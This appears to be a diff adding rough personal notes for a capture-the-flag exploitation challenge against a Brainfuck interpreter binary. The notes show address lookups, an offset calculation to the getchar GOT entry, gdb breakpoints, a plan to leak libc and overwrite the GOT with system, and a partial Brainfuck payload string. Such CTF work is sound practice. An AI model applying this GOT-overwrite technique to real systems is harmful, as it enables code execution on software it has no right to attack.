@@ -1,0 +1,54 @@
+We can see that we have a global variable p that represnets the pointer for the brainfuck program.
+
+We can see that it's address is 0x804a080.
+
+We also have tape variable but im not sure yet what it is doing yet.
+
+
+Ok I it seems that the calculations are done on tape - address 0x804a0a0.
+
+
+
+My idea right now is to reach the address of the getchar in the plt and overwrite it with the address of system or something.
+
+
+The address of the getchar is  0x804a00c (or 0x8048440 , Im not sure about that yet.)
+
+
+We can calculate the offset we need like that
+>>> 0x0804a0a0 - 0x804a00c
+148
+>>> print '<' * 148
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+
+We can find libc_system in 0xf7dd3800
+
+
+
+
+Breakpoints:
+Num     Type           Disp Enb Address    What
+2       breakpoint     keep y   0x080485f3 <do_brainfuck+23>
+        breakpoint already hit 155 times
+        x/wx 0x804a080
+        x/32wx 0x804a0a0
+3       breakpoint     keep y   0x08048629 <do_brainfuck+77>
+        breakpoint already hit 5 times
+
+
+
+The _start is at 0x80484e0
+
+
+My current thoughts are:
+1. I need to leak the address of libc
+2. Then I need to rewind the program by overwriting the address of getchar got with _start
+3. Then I can find the address of system and run the usual exploit
+
+
+Note:
+* The got stays the same even after jumping to _start.
+
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>..>.>.>.,
